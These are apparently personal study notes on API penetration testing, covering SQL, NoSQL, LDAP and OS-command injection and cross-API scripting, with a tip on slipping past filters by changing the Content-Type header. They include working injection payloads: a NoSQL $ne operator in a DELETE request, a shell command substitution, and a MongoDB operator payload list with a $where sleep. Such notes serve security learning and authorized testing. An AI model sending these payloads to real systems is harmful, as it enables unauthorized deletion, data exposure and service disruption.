this result of lack of input sanitization Security Misconfigurations
inject some SQL, Non-SQL `DELETE /api/bookings?bookingId[$ne]=678`, LDAP, OS command `appid=$(/etc/pod/power_down.sh)`injections in body, or url parameters , may the API pass your data directly to DBMS
> use payloads and injection all from [[vulns checklist/*]] 

> *NoSQLi* is more likely happened than *SQLi*, cuz of APIs commonly use NoSQL databases due to how well they scale with the architecture designs common among APIs
#### Cross Api Scripting (XAS)
>this happened when the API used on web third-party app, and XSS payload submitted got executed on it, because lack of input sanitization, where the web trust data come from that api

XAS does have more complexities than XSS, because the web applica- tion must meet certain conditions:
- The web app must poorly sanitize the data submitted through its own API or a third- party one
- The API input must also be injected into the web application in a way that would launch the script
- third-party API, may be limited the number of requests you can make through its platform.
- XAS inherent same XSS challenges; input validation, bypass WAF
if sending XSS/XAS payload make 400 res, try to change `Content-Type: text/html` 

#### No-SQL injection
> *NoSQL* is an umbrella term that means the database does not use SQL
when sending nested objects like`{"$gt":""}` don't around the object with double quotes 
 ~~`"{"$gt":""}"`~~
```mongodb
$gt 
{"$gt":""} 
{"$gt":-1} 
$ne 
{"$ne":""} 
{"$ne":-1} 
$nin 
{"$nin":1} 
{"$nin":[1]} 
|| '1'=='1 
// 
||'a'\\'a 
'||'1'=='1';// 
'/{}: 
'"\;{} 
'"\/$[].> 
{"$where": "sleep(1000)"}
```